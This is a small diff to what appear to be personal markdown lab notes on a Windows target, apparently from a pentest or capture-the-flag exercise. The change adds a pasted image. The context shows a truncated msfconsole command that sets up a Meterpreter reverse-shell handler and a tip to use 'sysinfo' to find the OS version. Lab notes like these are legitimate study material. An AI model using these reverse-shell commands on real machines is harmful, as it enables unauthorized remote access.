@@ -111,3 +111,5 @@ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse
 ![[Pasted image 20251018212634.png]]
 # Finding the OS Version of the Windows Machine
 In meterpreter use the ***sysinfo*** command
+![[Pasted image 20251018214032.png]]
+
